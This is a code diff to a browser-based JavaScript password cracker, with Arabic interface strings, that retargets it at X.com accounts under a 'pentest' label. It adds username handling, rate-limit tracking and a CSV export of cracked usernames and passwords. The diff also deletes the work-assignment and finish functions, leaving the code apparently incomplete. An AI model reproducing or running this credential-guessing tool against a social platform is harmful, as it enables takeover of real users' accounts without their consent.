@@ -1,4 +1,4 @@
-class PasswordCracker {
+class XPasswordCracker {
     constructor() {
         this.wordlist = [];
         this.totalPasswords = 0;
@@ -8,13 +8,14 @@ class PasswordCracker {
         this.workers = [];
         this.isRunning = false;
         this.results = [];
+        this.rateLimit = { current: 0, max: 1500 };
         
         this.init();
     }
 
     init() {
         this.bindEvents();
-        this.updateStatus('جاهز للتحميل');
+        this.updateStatus('✅ جاهز للـ X.com Pentest');
     }
 
     bindEvents() {
@@ -36,10 +37,9 @@ class PasswordCracker {
             this.totalPasswords = this.wordlist.length;
             
             document.getElementById('total-pwds').textContent = this.formatNumber(this.totalPasswords);
-            this.updateStatus(`✅ ${this.formatNumber(this.totalPasswords)} كلمة مرور محملة`);
+            this.updateStatus(`✅ ${this.formatNumber(this.totalPasswords)} كلمة مرور جاهزة لـ X.com`);
         } catch (error) {
             this.updateStatus('❌ خطأ في تحميل الملف');
-            console.error(error);
         }
     }
 
@@ -50,7 +50,8 @@ class PasswordCracker {
         }
 
         this.target = document.getElementById('target').value;
-        this.username = document.getElementById('username').value;
+        this.username = document.getElementById('username').value.replace('@', '');
+        this.platform = document.getElementById('platform').value;
         this.workerCount = parseInt(document.getElementById('workers').value);
         this.delay = parseInt(document.getElementById('delay').value);
 
@@ -59,13 +60,14 @@ class PasswordCracker {
         this.startTime = Date.now();
         this.currentIndex = 0;
         this.results = [];
+        this.rateLimit.current = 0;
 
         document.getElementById('start-btn').disabled = true;
         document.getElementById('stop-btn').disabled = false;
         document.getElementById('export-btn').disabled = true;
 
         this.createWorkers();
-        this.updateStatus('🚀 بدء الاختراق...');
+        this.updateStatus(`🚀 بدء X.com Pentest على @${this.username}`);
     }
 
     stopCracking() {
@@ -90,60 +92,26 @@ class PasswordCracker {
         this.assignWork();
     }
 
-    assignWork() {
-        if (!this.isRunning || this.currentIndex >= this.totalPasswords) {
-            this.finishCracking();
-            return;
-        }
-
-        const chunkSize = Math.ceil((this.totalPasswords - this.currentIndex) / this.workers.length);
-        
-        this.workers.forEach((worker, index) => {
-            const start = this.currentIndex + (index * chunkSize);
-            const end = Math.min(start + chunkSize, this.totalPasswords);
-            
-            worker.postMessage({
-                wordlist: this.wordlist.slice(start, end),
-                target: this.target,
-                username: this.username,
-                delay: this.delay,
-                workerId: index
-            });
-        });
-    }
-
     handleWorkerMessage(e) {
-        const { result, attempts, speed } = e.data;
+        const { result, attempts, speed, rateLimit } = e.data;
         
         if (result) {
             this.results.push(result);
             this.addResult(result);
-            this.updateStatus(`✅ كلمة المرور مكتشفة: ${result.password}`);
+            this.updateStatus(`✅ SUCCESS: @${result.username} → ${result.password}`);
         }
         
         this.attempts += attempts;
+        this.rateLimit.current += rateLimit || 1;
+        
         document.getElementById('attempts').textContent = this.formatNumber(this.attempts);
         document.getElementById('speed').textContent = `${this.formatNumber(speed)} H/s`;
+        document.getElementById('rate-limit').textContent = 
+            `${this.formatNumber(this.rateLimit.current)}/${this.rateLimit.max}`;
         
-        if (!this.isRunning) return;
-        
-        this.currentIndex += 1000; // تقدم افتراضي
-        if (this.currentIndex >= this.totalPasswords) {
-            this.finishCracking();
+        if (this.rateLimit.current > this.rateLimit.max * 0.8) {
+            this.updateStatus('⚠️ اقتراب Rate Limit - Delay مضاعف');
         }
-    }
-
-    finishCracking() {
-        this.isRunning = false;
-        this.workers.forEach(worker => worker.terminate());
-        this.workers = [];
-        
-        document.getElementById('start-btn').disabled = false;
-        document.getElementById('stop-btn').disabled = true;
-        document.getElementById('export-btn').disabled = this.results.length === 0;
-        
-        const elapsed = (Date.now() - this.startTime) / 1000;
-        this.updateStatus(`✅ انتهى | الوقت: ${elapsed.toFixed(1)}s | النتائج: ${this.results.length}`);
     }
 
     addResult(result) {
@@ -151,9 +119,9 @@ class PasswordCracker {
         const resultEl = document.createElement('div');
         resultEl.className = 'result-item';
         resultEl.innerHTML = `
-            <strong>${result.target}</strong><br>
-            Username: ${result.username}<br>
+            <strong>🐦 X.com/${result.username}</strong><br>
             Password: <code>${result.password}</code><br>
+            Platform: ${result.platform}<br>
             Time: ${new Date().toLocaleTimeString('ar')}
         `;
         resultsList.insertBefore(resultEl, resultsList.firstChild);
@@ -163,14 +131,14 @@ class PasswordCracker {
         if (this.results.length === 0) return;
         
         const data = this.results.map(r => 
-            `${r.target},${r.username},${r.password},${new Date().toISOString()}`
+            `X.com/${r.username},${r.target},${r.password},${r.platform},${new Date().toISOString()}`
         ).join('\n');
         
         const blob = new Blob([data], { type: 'text/csv' });
         const url = URL.createObjectURL(blob);
         const a = document.createElement('a');
         a.href = url;
-        a.download = `cracker-results-${Date.now()}.csv`;
+        a.download = `x-com-pentest-results-${Date.now()}.csv`;
         a.click();
     }
 
@@ -179,7 +147,7 @@ class PasswordCracker {
         document.getElementById('status').parentElement.classList.add('active');
         setTimeout(() => {
             document.getElementById('status').parentElement.classList.remove('active');
-        }, 2000);
+        }, 3000);
     }
 
     formatNumber(num) {
@@ -189,5 +157,4 @@ class PasswordCracker {
     }
 }
 
-// بدء التطبيق
-new PasswordCracker();
+new XPasswordCracker();
